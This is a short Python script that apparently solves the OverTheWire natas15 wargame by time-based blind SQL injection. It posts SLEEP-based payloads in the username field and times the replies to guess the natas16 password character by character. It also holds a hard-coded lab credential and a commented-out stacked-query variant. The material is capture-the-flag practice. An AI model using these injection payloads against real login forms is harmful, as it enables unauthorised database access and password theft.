import requests             #type: ignore 

import time


url="http://natas15.natas.labs.overthewire.org"
auth=("natas15","SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")
data={"username":"username"}
params={"debug":1}


# query='natas18"; SELECT IF ((SELECT password from users where username="natas18") LIKE BINARY "a%", SLEEP(5),0); --'


fixed_prefix='natas16" and 0=(SELECT IF ((SELECT password from users where username="natas16") LIKE BINARY "'
fixed_suffix='%", SLEEP(5),1))  and "1"="1'
password=''

searchspace="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

for i in searchspace:
    query=f"{fixed_prefix}{password}{i}{fixed_suffix}"
    data["username"]=query
    start_time=time.time()
    r=requests.post(url,data=data,auth=auth,params=params)
    end_time=time.time()
    print(f"{i}: time={end_time-start_time}s")
    print(f"\n {r.text}")



